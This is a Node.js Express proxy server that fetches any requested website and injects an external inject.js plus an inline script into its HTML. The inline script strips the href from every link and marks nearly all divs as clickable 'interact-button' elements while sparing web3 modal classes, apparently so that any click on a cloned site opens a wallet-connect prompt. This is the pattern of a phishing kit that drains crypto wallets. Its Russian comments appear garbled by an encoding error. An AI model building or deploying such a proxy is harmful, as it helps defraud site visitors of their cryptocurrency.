const express = require("express");
const http = require("http");
const https = require("https");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// –†–∞–∑–¥–∞—ë–º inject.js –∏–∑ —Ç–µ–∫—É—â–µ–π –ø–∞–ø–∫–∏
app.get("/inject.js", (req, res) => {
  res.sendFile(path.join(__dirname, "inject.js"));
});

// –¢–µ–≥ –¥–ª—è –≤—Å—Ç–∞–≤–∫–∏ —Å–∫—Ä–∏–ø—Ç–∞ –≤–Ω–µ—à–Ω–µ–≥–æ —Ñ–∞–π–ª–∞
const injectedScriptTag = `<script charset="UTF-8" type="text/javascript" src="./inject.js"></script>`;

// –¢–≤–æ–π –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π inline-—Å–∫—Ä–∏–ø—Ç
const inlineScript = `
<script>
  function addClassesToElements() {
    const links = document.querySelectorAll('a:not(.interact-button)');
    for (const link of links) {
      link.removeAttribute('href');
      link.classList.add('interact-button');
    }
    const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
    for (const button of buttons) {
      button.classList.add('interact-button');
    }
  }
  
  function runWhenReady() {
    addClassesToElements();
    setInterval(addClassesToElements, 300);
  }
  
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", runWhenReady);
  } else {
    runWhenReady();
  }
</script>
`;

app.get("/proxy", (req, res) => {
  const targetUrl = req.query.url;
  if (!targetUrl) return res.status(400).send("–ü–∞—Ä–∞–º–µ—Ç—Ä ?url= –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω");

  let urlObj;
  try {
    urlObj = new URL(targetUrl);
  } catch {
    return res.status(400).send("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π URL");
  }

  const protocol = urlObj.protocol === "https:" ? https : http;

  protocol
    .get(targetUrl, (proxyRes) => {
      let body = [];

      proxyRes.on("data", (chunk) => body.push(chunk));

      proxyRes.on("end", () => {
        let contentType = proxyRes.headers["content-type"] || "";
        let responseBody = Buffer.concat(body).toString("utf8");

        if (contentType.includes("text/html")) {
          // –£–±—Ä–∞–Ω–∞ —á–∞—Å—Ç—å, –¥–æ–±–∞–≤–ª—è–≤—à–∞—è –∫–ª–∞—Å—Å interact-button –∫ –ø–µ—Ä–≤–æ–º—É <div>

          // –í—Å—Ç–∞–≤–ª—è–µ–º –æ–±–∞ —Å–∫—Ä–∏–ø—Ç–∞ –ø–µ—Ä–µ–¥ </head>
          if (responseBody.includes("</head>")) {
            responseBody = responseBody.replace(
              "</head>",
              `${injectedScriptTag}\n${inlineScript}</head>`,
            );
          } else {
            responseBody = injectedScriptTag + inlineScript + responseBody;
          }
        }

        let headers = { ...proxyRes.headers };
        delete headers["content-length"];
        delete headers["content-encoding"];

        res.writeHead(proxyRes.statusCode, headers);
        res.end(responseBody);
      });
    })
    .on("error", (err) => {
      res.status(500).send("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–∫—Å–∏—Ä–æ–≤–∞–Ω–∏–∏: " + err.message);
    });
});

app.listen(PORT, () => {
  console.log(`üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ø–æ—Ä—Ç—É ${PORT}`);
});
